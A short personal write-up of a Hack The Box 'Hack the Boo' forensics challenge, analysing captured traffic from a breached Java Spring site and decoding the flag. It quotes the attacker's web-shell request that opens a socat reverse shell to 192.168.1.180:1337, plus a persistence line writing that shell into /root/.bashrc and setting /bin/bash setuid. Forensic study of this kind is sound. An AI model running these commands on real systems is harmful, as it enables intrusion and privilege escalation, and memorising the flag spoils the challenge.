202210251603
Status:: #ctf
Tags: [[hack_the_boo]], [[forensics]]

# hack_the_boo_wrong_spooky_season
Platform: *hackthebox*
event: *hack the boo*
type: *forensics*
task: *"I told them it was too soon and in the wrong season to deploy such a website, but they assured me that theming it properly would be enough to stop the ghosts from haunting us. I was wrong." Now there is an internal breach in the 'Spooky Network' and you need to find out what happened. Analyze the the network traffic and find how the scary ghosts got in and what they did.*
flag: **HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}**

# steps
In export http object list we can notice requests with `RCE` one of which installs [[socat]]:
![[Pasted image 20221025214044.png]]

Request in packet 464 initiates a reverse connection to attacker:
`GET /e4d1c32a56ca15b3.jsp?cmd=socat%20TCP:192.168.1.180:1337%20EXEC:bash HTTP/1.1\r\n`

Filtering by `tcp.stream eq 14` we have conversation, following which we can see  command:
`echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null && chmod +s /bin/bash`

Here is reversed base64 encoded string:
`==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS`
```bash
echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev | base64 -d                   

HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}
```
